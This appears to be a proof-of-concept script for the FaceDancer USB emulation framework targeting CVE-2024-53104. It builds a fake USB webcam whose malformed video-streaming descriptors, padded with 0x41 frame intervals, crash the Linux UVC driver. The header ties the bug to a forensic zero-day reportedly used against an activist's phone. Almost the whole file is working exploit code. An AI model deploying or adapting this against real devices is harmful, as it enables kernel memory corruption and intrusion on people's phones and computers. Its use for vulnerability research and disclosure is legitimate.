#!/usr/bin/env python3
#
# This file is part of FaceDancer.
#
"""
CVE-2024-53104 proof of concept:
Based on Amnesty's analysis from https://securitylab.amnesty.org/latest/2025/02/cellebrite-zero-day-exploit-used-to-target-phone-of-serbian-student-activist/
Causes a kernel oops on a read of 0x0041414141414141: https://gist.github.com/zhuowei/e489b14c3fdb807cb964d105521fb354
"""

import asyncio
import logging

from facedancer import main
from facedancer.future import USBDevice, USBConfiguration, USBInterface, USBEndpoint, USBDirection, USBTransferType, use_inner_classes_automatically, USBClassDescriptor, vendor_request_handler
from facedancer.classes import USBDeviceClass

USB_SUBCLASS_VIDEO_CONTROL = 1
USB_SUBCLASS_VIDEO_STREAMING = 2
USB_DT_CS_INTERFACE = 0x24

UVC_VC_HEADER = 1

UVC_VS_UNDEFINED = 0
UVC_VS_INPUT_HEADER = 1
UVC_VS_FORMAT_DV = 0x0c

OUT_ENDPOINT = 1
IN_ENDPOINT  = 3

@use_inner_classes_automatically
class USBWebcamDevice(USBDevice):
    vendor_id: int = 0x04f2
    product_id: int = 0xb071

    class _Configuration(USBConfiguration):
        class _Interface(USBInterface):
            class_number    : int = USBDeviceClass.VIDEO
            subclass_number    : int = USB_SUBCLASS_VIDEO_CONTROL
            class _UVCStandardControlDescriptor(USBClassDescriptor):
                number: int = 0
                raw: bytes = bytes([
                        0x0d, # bLength
                        USB_DT_CS_INTERFACE, # bDescriptorType
                        UVC_VC_HEADER, # bDescriptorSubtype
                        0x00, 0x01, # bcdUVC
                        0x0d, 0x00,# wTotalLength
                        0x00, 0x00, 0x00, 0x00, # dwClockFrequency
                        0x1, # bInCollection
                        0x1, # baInterfaceNr(0)
                ])
        class _Interface2(USBInterface):
            number : int = 1
            class_number    : int = USBDeviceClass.VIDEO
            subclass_number    : int = USB_SUBCLASS_VIDEO_STREAMING
            class _UVCStreamingDescriptor(USBClassDescriptor):
                number: int = 0
                raw: bytes = bytes([
                    14, #bLength
                    USB_DT_CS_INTERFACE, #bDescriptorType
                    UVC_VS_INPUT_HEADER, #bDescriptorSubtype
                    1, #bNumFormats
                    14 + 9, 0x00, #wTotalLength
                    0x82, # bEndpointAddress
                    0x00, # bmInfo
                    0x02, # bTerminalLink
                    0x00, # bStillCaptureMethod
                    0x00, # bTriggerSupport
                    0x00, # bTriggerUsage
                    0x01, # bControlSize
                    0x00, # bmaControls(0)
                ]) + bytes([
                    9, # bLength
                    USB_DT_CS_INTERFACE, # bDescriptorType
                    UVC_VS_FORMAT_DV, # bDescriptorSubtype
                    0, # 3
                    0, # 4
                    0, # 5
                    0, # 6
                    0, # 7
                    0, # 8: dv format])
                ]) + bytes([
                    26 + 4*57, # bLength
                    USB_DT_CS_INTERFACE, # bDescriptorType
                    UVC_VS_UNDEFINED, # bDescriptorSubtype
                    1, # bFrameIndex
                    0, # bmCapabilities
                    0x00, 0x00, # wWidth
                    0x00, 0x00, # wHeight
                    0x00, 0x00, 0x00, 0x00, # dwMinBitRate
                    0x00, 0x00, 0x00, 0x00, # dwMaxBitRate
                    0x00, 0x00, 0x00, 0x00, # dwMaxVideoFrameBufferSize
                    0x00, 0x00, 0x00, 0x00, # dwDefaultFrameInterval
                    57, # bFrameIntervalType
                ] + [0x41, 0x41, 0x41, 0x41]*57 # dwFrameInterval(n)
                )

device = USBWebcamDevice()

async def run_webcam():
    logging.info("Beginning message typing demo...")

main(device, run_webcam())
